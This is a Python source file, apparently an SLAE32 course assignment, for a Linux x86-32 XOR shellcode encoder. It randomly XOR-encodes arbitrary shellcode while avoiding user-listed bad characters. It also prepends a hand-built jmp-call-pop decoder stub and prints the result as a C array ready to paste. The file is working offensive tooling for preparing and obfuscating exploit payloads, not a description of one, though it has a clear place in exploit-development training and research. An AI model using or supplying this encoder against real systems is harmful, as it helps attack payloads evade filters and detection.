#!/usr/bin/python3

'''
	Jean-Pierre LESUEUR (@DarkCoderSc)
	jplesueur@phrozen.io
	https://www.phrozen.io/
	https://github.com/darkcodersc
	License : MIT
	---
	SLAE32 Assignment 4 : Linux x86-32 Shellcode Encoder.
	---
	Description:
		Encode shellcode using XOR.
		Support shellcode from any size.
		Support bad chars.
'''

import sys
import random
from textwrap import wrap
import argparse

############################################################################################################

verbose = False
shellcode = None
encoded_shellcode = None

############################################################################################################
#
# Define bad characters and white characters.
# 
# white characters are characters used by the decoder itself so it can't be present in bad character array.
#
############################################################################################################

#
# Bad chars list
#
default_bad_chars = bytearray([0x00])

bad_chars = None

#
# Whitelist chars (Can't be in bad chars)
#
white_chars_base = bytearray([
							0x01, 0x05, 0x1e, 0x24, 0x26, 0x2e, 0x30, 0x31,
						    0x43, 0x44, 0x46, 0x5e, 0x88, 0x8a, 0xc0, 0xc4,
						    0xc9, 0xdb, 0xe8, 0xeb, 0xf1, 0xff
						])

white_chars_size8 = bytearray([0xb1, 0x1a])

white_chars_size16 = bytearray([0x66, 0xb9, 0x1c, 0xdf])

white_chars_size32 = bytearray([0xb9, 0x1d, 0xde])

white_chars = None

############################################################################################################
#
# Utilities Definitions
#
############################################################################################################

#
# Log Defs
#
def success(message):
    print("[\033[32m+\033[39m] " + message)

def err(message):
    print("[\033[31m-\033[39m] " + message)

def warn(message):
    print("[\033[33m!\033[39m] " + message)

def info(message):
	if verbose:
		print("[\033[34m*\033[39m] " + message)

#
# Convert Byte Array to Byte String
#
def bytearr_to_bytestr(data):
	return ''.join(f"\\x{'{:02x}'.format(x)}" for x in data)

#
# Convert Byte String to Byte Array
#
def bytestr_to_bytearr(data):
	return list(bytearray.fromhex(data.replace("\\x", " ")))

############################################################################################################
#
# Prepare Badchar List (Need to be done before calling EncodeShellcode())
#
############################################################################################################

def PrepareBadChars(reg_size):
	global bad_chars
	global white_chars

	result = True	

	bad_chars = bytearray()
	white_chars = bytearray()

	if argv.badchars_str:		
		bad_chars.extend(default_bad_chars)
		white_chars.extend(white_chars_base)

		if (reg_size == 8):						
			white_chars.extend(white_chars_size8)
		elif (reg_size == 16):						
			white_chars.extend(white_chars_size16)
		elif (reg_size == 32):
			white_chars.extend(white_chars_size32)

		for badchar in bytestr_to_bytearr(argv.badchars_str):
			if (white_chars.find(badchar, 0) == -1):
				bad_chars.append(badchar)
			else:
				warn(f"{hex(badchar)} is whitelisted. It can't be a badchar")

				result = False

	return result

############################################################################################################
#
# Encode Shellcode (XOR) Definition
#
############################################################################################################

def EncodeShellcode():
	global shellcode
	global encoded_shellcode	

	#
	# Start encoding
	#	
	encoded_shellcode = bytearray()	
	
	for opcode in shellcode:	
		candidates = random.sample(range(255), 255)

		found = False
		for candidate in candidates:							
			result = opcode ^ candidate
			if (bad_chars.find(result, 0) == -1) and (bad_chars.find(candidate, 0) == -1):					
				found = True
				break					

		if not found:
			return False

		encoded_shellcode.append(result)
		encoded_shellcode.append(candidate)

	return True

############################################################################################################
#
# Program Entry Point
#
############################################################################################################
parser = argparse.ArgumentParser(description='Shellcode Xor Encoder (@DarkCoderSc)')

parser.add_argument('-s', action="store", dest="shellcode_str", required=True, help="Shellcode to encode (Ex: \\x31\\xe2...\\xeb).")
parser.add_argument('-b', action="store", dest="badchars_str", required=False, help="Bad chars list (Ex: \\x0a\\x0d), NULL is always a bad char.")
parser.add_argument('-v', action="store_true", default=False, dest="verbose", required=False, help="Enable verbose.")
parser.add_argument('-j', action="store", dest="junk_length", type=int, default=0, required=False, help="Append junk opcode at the end of the original shellcode to vary it size.")
parser.add_argument('-p', action="store_true", default=False, dest="paranoid_bcheck", required=False, help="Check if final payload is really free of badchars (Paranoid mode).")
try:
	argv = parser.parse_args()

	verbose = argv.verbose
except IOError:
	parse.error

	sys.exit()

#
# Setup shellcode array
#
shellcode = bytestr_to_bytearr(argv.shellcode_str)

#
# Optionnaly append junk data at the end to vary shellcode size and avoid bad chars.
#
if (argv.junk_length > 0):
	shellcode.extend(b"\x90"*argv.junk_length)

############################################################################################################
#
# Encode and ajust decoder
# (!) Retry encoding until no bad chars are found in generated opcode (during relocation)
#
############################################################################################################

shellcode_length = len(shellcode)

info(f"{shellcode_length} bytes loaded from shellcode to encode.")

reg_size = 0

if (shellcode_length <= (2**8-1)):	
	reg_size = 8
elif (shellcode_length <= (2**16-1)):
	reg_size = 16
elif (shellcode_length <= (2**32-1)):
	reg_size = 32

if (reg_size == 0):
	err("Shellcode length is not compatible with our encoder.")

	sys.exit()

#
# Prepare Badchars
#
info("Prepare bad chars list...")
if not PrepareBadChars(reg_size):
	err("Invalid badchar, one or multiple badchar are not compatible with our encoder.")

	sys.exit()

info("Done.")

#
# Encode Shellcode (XOR)
#
info("Start shellcode encoding...")
if not EncodeShellcode():
	err("Could not encode shellcode, with current badchar list. Likely reason: to much bad chars.")

	sys.exit()

info("Done.")

# 
# Upgrade ecx counter / jmp / call relocation.
#		
if (reg_size == 8):		
	counter_opcode = b"\xb1"
	counter_opcode += shellcode_length.to_bytes(1, byteorder="little")

	jmp_get_shellcode_opcode = b"\x1a"
	call_decoder_opcode = b"\xe1"
elif (reg_size == 16):
	counter_opcode = b"\x66\xb9"
	counter_opcode += shellcode_length.to_bytes(2, byteorder="little")

	jmp_get_shellcode_opcode = b"\x1c"
	call_decoder_opcode = b"\xdf"
elif (reg_size == 32):		
	counter_opcode = b"\xb9"
	counter_opcode += shellcode_length.to_bytes(4, byteorder="little")	

	jmp_get_shellcode_opcode = b"\x1d"
	call_decoder_opcode = b"\xde"	

info(f"counter opcode=[{bytearr_to_bytestr(counter_opcode)}]")
info(f"jmp_get_shellcode opcode=[{bytearr_to_bytestr(jmp_get_shellcode_opcode)}]")
info(f"call_decoder opcode=[{bytearr_to_bytestr(call_decoder_opcode)}]")

info("Checking if additional opcodes now include bad chars...")
for opcode in counter_opcode:	
	if bad_chars.find(opcode) != -1:		
		err(f"A badchar \"{hex(opcode)}\" was introduced during OpCode generation. Use option \"-j\" to vary shellcode length and try again.")

		sys.exit()

info("Done.")


############################################################################################################
#
# Build Final Payload
#
############################################################################################################

info("Build our final payload...")

payload = b"" 

# <_start>:
payload += b"\xeb"
payload += jmp_get_shellcode_opcode     # jmp <get_shellcode>

# <decoder>:
payload += b"\x5e"                      # pop    esi
payload += b"\x31\xc9"                  # xor    ecx,ecx
payload += b"\x31\xc0"                  # xor    eax,eax
payload += b"\x31\xdb"                  # xor    ebx,ebx

payload += counter_opcode				# mov cl|cx|ecx, <EncodedShellcode / 2>

# <decode>:
payload += b"\x8a\x24\x1e"              # mov    ah,BYTE PTR [esi+ebx*1]
payload += b"\x8a\x44\x1e\x01"          # mov    al,BYTE PTR [esi+ebx*1+0x1]
payload += b"\x30\xc4"                  # xor    ah,al    
payload += b"\x88\x26"                  # mov    BYTE PTR [esi],ah    
payload += b"\x43"                      # inc    ebx
payload += b"\x46"                      # inc    esi
payload += b"\xe2\xf1"                  # loop   <decode>
payload += b"\xeb\x05"                  # jmp    <EncodedShellcode>

# <get_shellcode>:
payload += b"\xe8"
payload += call_decoder_opcode          # call  <decoder>
payload += b"\xff\xff\xff"

# <EncodedShellcode>:
payload += bytes(encoded_shellcode)

info("Done.")

############################################################################################################
#
# Verify if we don't have any badchars (Optional)
# Should never occurs, if it occurs it means we have a bug somewhere.
#
############################################################################################################

if argv.paranoid_bcheck:
	for opcode in payload:
		if bad_chars.find(opcode, 0) != -1:
			err("Bad char found in final payload. Possible bug affects our encoder.")
			sys.exit()
		
	
	success("Final payload is completely free of bad chars.")

############################################################################################################
#
# Print C array payload to termina. Ready for use (Copy / Paste)
#
############################################################################################################

payload_str = bytearr_to_bytestr(payload)

size = int(len(payload_str) / 4)

final_payload = "// Shellcode size = {}\n".format(size)
final_payload += "unsigned char code[] = \\\n"

for l in wrap(payload_str, 64):
	final_payload += "\t\"{}\"\n".format(l)

final_payload = final_payload[:-1] + ";"

print(f"\n{final_payload}\n")

success(f"Shellcode successfully encoded, payload size: {size}")
